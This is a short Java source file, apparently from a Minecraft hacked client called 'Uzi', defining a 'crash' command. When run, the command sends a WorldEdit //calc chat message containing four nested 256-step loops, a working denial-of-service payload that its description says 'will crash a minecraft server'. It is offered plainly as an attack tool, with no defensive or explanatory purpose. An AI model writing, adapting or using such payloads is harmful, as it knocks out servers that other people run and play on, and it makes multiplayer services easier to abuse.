package host.kix.uzi.command.commands;

import org.apache.commons.lang3.text.WordUtils;

import host.kix.uzi.Uzi;
import host.kix.uzi.command.Command;
import host.kix.uzi.utilities.minecraft.Logger;
import net.minecraft.client.Minecraft;

public class Crash extends Command {

    public Crash() {
        super("crash", "a command that will crash a minecraft server!", "crash", "exploit");
    }

    @Override
    public void dispatch(String message) {
        Minecraft.getMinecraft().thePlayer.sendChatMessage("//calc for(i=0;i<256;i++)for(j=0;j<256;j++)for(k=0;k<256;k++)for(l=0;l<256;l++)ln(pi)");
        Logger.logToChat("Trying to crash the server....");
    }
    
}
